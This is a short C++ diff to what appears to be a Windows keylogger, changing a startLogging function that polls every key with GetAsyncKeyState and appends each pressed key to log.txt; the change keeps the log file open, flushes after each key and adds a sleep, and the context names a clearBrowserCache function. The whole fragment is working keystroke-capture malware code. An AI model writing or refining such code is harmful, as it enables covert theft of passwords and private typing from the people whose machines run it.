@@ -27,14 +27,19 @@ void clearBrowserCache(){
 }
 
 void startLogging(){
+
+    std::ofstream logg;
+    logg.open("log.txt", std::ios::app);
+    
     while(true){
         for (int i = 0x08; i <= 0xFE; i++){
             if (GetAsyncKeyState(i) & 0x8000) {
-                std::ofstream log;
-                log.open("log.txt", std::ios::app);
-                log << char(i);
+                logg.open("log.txt", std::ios::app);
+                logg << char(i);
+                logg.flush();
             }
         }
+        Sleep(100);
     }
 }
 
